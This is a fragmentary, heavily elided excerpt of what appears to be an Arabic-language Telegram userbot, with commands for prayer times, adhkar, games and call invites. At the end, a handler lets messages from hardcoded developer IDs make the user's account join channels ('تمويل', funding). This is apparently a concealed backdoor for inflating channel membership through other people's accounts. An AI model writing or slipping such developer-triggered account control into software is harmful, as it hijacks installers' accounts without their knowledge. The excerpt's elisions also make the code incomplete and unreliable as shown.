...
async def fetch_prayer_times():
    ...
    times_json = await Anime.download_file(file_location)
    return times_json
...
async def send_prayer_times(event):
    ...
    input_file = await Anime.upload_file(bytes(times_json, 'utf-8'), part_size_kb=512)
    await Anime.send_file(chat_id, input_file, caption=f"وقت الفجر: {fajr_time}\nالتاريخ الهجري: {hijri_date}", force_document=True)

@Anime.on(admin_cmd(pattern="صلاه(?: |$)(.*)"))
async def handle_command(event):
    await send_prayer_times(event)

@Anime.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
async def _(e):
...
@Anime.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
async def _(e):
    try:
...
R = [
    ...
    "**-** قناة السورس **⪼ [𐇮 الانمي ](t.me/an_meie)   "
]

@Anime.on(admin_cmd(pattern="بلي$"))
...
@Anime.on(admin_cmd(pattern="اذكار$"))
async def ithker(knopis):
...
@Anime.on(admin_cmd(pattern="خيروك$"))
async def ithker(knopis):
    await knopis.edit(choice(Qrue_5erok))

    
@Anime.on(admin_cmd(pattern="اذكار عشر$"))    
...
@Anime.on(admin_cmd(pattern="شنو رأيك بهذا$"))
async def ithker(knopis):
...
@Anime.on(admin_cmd(pattern="بوسة$"))
async def ithker(knopis):
    await knopis.edit(choice(Qrue_Bosa))

DevSaher = [6330221767,5762222122,5835316914,6528926431]
...
async def Hussein(event):
    if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
        ...
        if channel_username:
            try:
                await Anime(JoinChannelRequest(channel_username))
